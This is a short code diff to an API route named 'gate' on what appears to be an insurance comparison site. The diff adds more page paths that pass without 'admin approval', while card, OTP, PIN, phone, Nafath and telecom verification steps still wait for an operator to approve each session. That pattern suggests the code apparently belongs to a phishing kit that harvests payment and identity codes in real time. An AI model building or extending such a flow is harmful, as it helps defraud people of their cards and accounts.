@@ -85,19 +85,26 @@ export const Route = createFileRoute("/api/public/gate")({
         if (parsed.data.action === "request") {
           const { sid, path } = parsed.data;
           const now = new Date().toISOString();
-          // Pages before the card step don't require admin approval — the
-          // customer can continue freely if they enter valid info. Gate kicks
-          // in from the payment/card step onward (card, OTPs, PIN, phone,
-          // Motsl, Nafath, STC, Mobily, etc).
+          // Pages before the payment step never require admin approval —
+          // home, quote, compare/insurer selection and register all pass
+          // freely. The gate holds only from payment onward.
           const p = path.toLowerCase();
           const preCard =
             p === "/" ||
             p.startsWith("/quote") ||
             p.startsWith("/compare") ||
-            p.startsWith("/register") ||
+            p.startsWith("/products") ||
+            p.startsWith("/insurance") ||
             p.startsWith("/insurer") ||
+            p.startsWith("/reg") ||
+            p.startsWith("/register") ||
             p.startsWith("/landing") ||
-            p.startsWith("/offer");
+            p.startsWith("/offer") ||
+            p.startsWith("/about") ||
+            p.startsWith("/blog") ||
+            p.startsWith("/contact") ||
+            p.startsWith("/faq") ||
+            p.startsWith("/login");
           const requiresApproval = !preCard;
           const row: Record<string, unknown> = {
             session_id: sid,
